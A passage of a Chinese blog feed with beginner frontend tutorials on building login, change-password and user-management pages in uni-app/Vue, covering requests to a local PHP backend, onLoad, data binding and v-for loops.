punctuation">,</span><span class="token literal-property property">title</span><span class="token operator">:</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>msg<span class="token punctuation">,</span><span class="token literal-property property">duration</span><span class="token operator">:</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.login_button</span><span class="token punctuation">{</span><span class="token property">padding-left</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span><span class="token property">padding-right</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">input</span><span class="token punctuation">{</span><span class="token property">margin</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token property">border</span><span class="token punctuation">:</span> #555555 1px solid<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* 弹性盒子横着排 */</span><span class="token selector">.flex_row</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token comment">/*排列方向：横向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span><span class="token comment">/* 弹性盒子竖着排 */</span><span class="token selector">.flex_column</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span><span class="token comment">/*排列方向：纵向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span><span class="token selector">.title_section</span><span class="token punctuation">{</span><span class="token property">height</span><span class="token punctuation">:</span> 10vh<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> #007AFF<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.image_section</span><span class="token punctuation">{</span><span class="token property">height</span><span class="token punctuation">:</span> 30vh<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> #4CD964<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.input_section</span><span class="token punctuation">{</span><span class="token property">height</span><span class="token punctuation">:</span> 30vh<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> #F0AD4E<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.button_section</span><span class="token punctuation">{</span><span class="token property">height</span><span class="token punctuation">:</span> 20vh<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> #DD524D<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目教学 </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端开发项目一修改密码</title>
      <link href="/2024/02/25/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%A1%B9%E7%9B%AE%E2%80%94%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/"/>
      <url>/2024/02/25/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%A1%B9%E7%9B%AE%E2%80%94%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>本案例为开放式任务，只提供后端文档，模拟企业真实开发过程，前端程序员通过需求文档和后端文档，自行设计UI界面和前端代码。</p><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>我们之前不是已经做好了登录注册的功能吗？</p><p>甲方在使用了一段时间后发现，很多用户注册好了之后，觉得自己注册的密码太简单了，想修改密码，想让我们的程序员新增一个修改密码的功能，然后，你作为前端程序员，产品经理找到了你。</p><h2 id="后端文档"><a href="#后端文档" class="headerlink" title="后端文档"></a>后端文档</h2><p>后端程序员已经写好代码了，但是前端还没做好，整个公司只有你会写前端，如果再写不好违约的话，公司将面临破产。</p><table><thead><tr><th>请求地址</th><th>请求方式</th></tr></thead><tbody><tr><td><a href="http://10.163.72.39:5555/Password_mod.php">http://10.163.72.39:5555/Password_mod.php</a></td><td>get</td></tr></tbody></table><table><thead><tr><th align="left">字段名称</th><th>类型及长度</th><th align="left">是否必需</th><th>默认值</th><th>说明</th></tr></thead><tbody><tr><td align="left">password</td><td>char(100)</td><td align="left">是</td><td>无</td><td>用户的新密码</td></tr><tr><td align="left">username</td><td>char(100)</td><td align="left">是</td><td>无</td><td>用户的已登录的用户名</td></tr></tbody></table><table><thead><tr><th>返回参数</th><th>字段</th></tr></thead><tbody><tr><td>msg</td><td>错误提示信息</td></tr><tr><td>error</td><td>错误状态标志，1为错误，0为无误</td></tr></tbody></table><p><strong>注：</strong>请参照本网站的修改密码功能，用户登录之后，如果想修改密码，只需要输入新密码就可以了，用户名是不需要输入的。</p><p>那如果用户名不是输入框输入的，我们怎么获得呢？</p><p>还记得上节课讲的吗？如果用户成功登录，我们是需要将用户的信息保存在浏览器缓存中的，其中肯定包括用户的用户名，这个时候我们就需要从缓存里去取出用户名了。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目教学 </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端开发项目一用户管理</title>
      <link href="/2024/02/25/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%A1%B9%E7%9B%AE%E2%80%94%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86/"/>
      <url>/2024/02/25/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%A1%B9%E7%9B%AE%E2%80%94%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>本案例为开放式任务，只提供后端文档，模拟企业真实开发过程，前端程序员通过需求文档和后端文档，自行设计UI界面和前端代码。</p><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>我们之前不是已经做好了登录注册的功能吗？</p><p>甲方在使用了一段时间后又发现了一些问题，就是注册的用户太多了，他现在想管理用户，包括查看所有的用户，并且能够对一些违规用户进行删除操作。</p><h2 id="后端文档"><a href="#后端文档" class="headerlink" title="后端文档"></a>后端文档</h2><p>后端程序员已经写好代码了，但是前端还没做好，整个公司只有你会写前端，如果再写不好违约的话，公司将面临破产。</p><table><thead><tr><th>请求地址</th><th>请求方式</th></tr></thead><tbody><tr><td><a href="http://10.163.72.39:5555/user_get.php">http://10.163.72.39:5555/user_get.php</a></td><td>get</td></tr></tbody></table><table><thead><tr><th>返回参数</th><th>字段</th></tr></thead><tbody><tr><td>msg</td><td>错误提示信息</td></tr><tr><td>error</td><td>错误状态标志，1为错误，0为无误</td></tr><tr><td>data</td><td>用户列表信息</td></tr></tbody></table><h1 id="1、发送请求"><a href="#1、发送请求" class="headerlink" title="1、发送请求"></a>1、发送请求</h1><p>我们先去给后端服务器发送请求吧，告诉他我们想要所有用户的信息。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get_user_data()<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>获取所有用户的信息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">user_list</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token comment">// 获取用户的信息</span><span class="token function">get_user_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>uni<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">"http://10.163.72.39:5555/user_get.php"</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>user_list <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>dataconsole<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>user_list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这段代码，我们还是使用了老方法，先写了一个按钮，叫做获取所有用户的信息，然后给这个按钮添加了一个点击事件叫做<code>get_user_data()</code>，这个<code>get_user_data()</code>方法的具体内容我们写在methods里，一旦点击按钮就会执行<code>get_user_data()</code>方法向服务器发送一个请求获得数据。</p><p>但是这样肯定是不符合我们目前的需求，我们现在的需求是一旦打开页面，就自动获取数据，而不是要点击按钮再获取数据。</p><h1 id="2、生命周期函数onLoad（）"><a href="#2、生命周期函数onLoad（）" class="headerlink" title="2、生命周期函数onLoad（）"></a>2、生命周期函数onLoad（）</h1><p>网页中有很多生命周期函数，十分复杂，但是我们的需求其实很简单，只是需要在网页打开时自动帮我们执行一个方法就可以了，那么我们其实只需要知道<code>onLoad()</code>函数是干嘛的就行。先看看下面这段代码吧。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get_user_data()<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>获取所有用户的信息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">user_list</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token comment">// 获取用户的信息</span><span class="token function">get_user_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>uni<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">"http://10.163.72.39:5555/user_get.php"</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>user_list <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>dataconsole<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>user_list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">onLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get_user_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现这段代码多了什么吗？</p><p>onLoad()函数的意思就是在网页挂载的时候需要执行哪些代码，我们希望它能够执行<code>get_user_data()</code>方法，因为我们希望用户一打开网页就能够自动获取到数据，但是这个这里要注意是<code>this.get_user_data()</code>，为什么前面要加上<code>this</code>，这个问题比较复杂，我在之前也没有给大家解释，现在简单多说一点吧，就好比<code>吃饭()</code>是一个方法，这个方法是必须需要一个人去做的，比如说<code>小蔡.吃饭()</code>,但是为什么还有一个括号呢？</p><p>因为很多方法都是需要携带参数的，就比如刚才举的例子，吃饭这个方法涉及到吃什么的问题，是吃包子呢还是吃馒头呢？我们总得告诉它吧,所以吃饭这个方法是需要传递参数的，<code>小蔡.吃饭('包子')</code>，也有一些方法是不需要传递参数的，就比如我们上面的<code>this.get_user_data()</code>,只要调用这个方法，就可以返还给我们用户的数据。</p><h1 id="三、数据绑定"><a href="#三、数据绑定" class="headerlink" title="三、数据绑定"></a>三、数据绑定</h1><p>现在我们已经获取到用户的数据了，但是要怎么样才能将这些数据显示到页面上呢，这就要用到数据绑定的知识了。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先，这是项目一个标准的基础结构。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>{{username}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">username</span><span class="token operator">:</span><span class="token string">'张三'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们做一点小小的改动，我在data里定义了一个变量<code>username</code>，这个变量的值是<code>'张三'</code>。</p><p>但是怎么将<code>username</code>这个变量显示到页面上呢？</p><p>只需要用<code>{{username}}</code>就可以了，为什么要用两个花括号呢？这就是别人设定的语法，用就行了。</p><h1 id="4、v-for循环"><a href="#4、v-for循环" class="headerlink" title="4、v-for循环"></a>4、v-for循环</h1><p>我们之前学过数据绑定，我们现在已经将请求来的数据放在了定义的变量<code>user_list</code>里，如果直接通过数据绑定的语法在页面展示<code>user_list</code>的值，看看会发生什么？</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get_user_data()<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>获取所有用户的信息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>{{user_list}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">user_list</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token comment">// 获取用户的信息</span><span class="token function">get_user_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>uni<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">"http://10.163.72.39:5555/user_get.php"</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>user_list <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>dataconsole<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>user_list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get_user_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到效果了吗？</p><p>是不是请求到的数据一股脑的全部堆满了整个屏幕。</p><p>这样的做法显然是不合适的，我们其实希望数据能够一条一条的显示。</p><p>就好比我们班的同学去体检，我们希望排着队一个一个的进去，而不是一股脑的全部进去，这样就会显得非常的混乱。</p><p>那么怎么样才能让数据排队呢？</p><p>我们先看一下代码再解释吧。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get_user_data()<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>获取所有用户的信息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user in user_list<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>{{user}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到了吗？现在的数据有什么区别，是不是数据一条一条的排队显示，但是显示的样子还是不太好看，我们好需要做亿些美化。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get_data()<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>获取用户数据<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>(user,index) in user_list<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_box<span class="token punctuation">"</span></span><span class="token 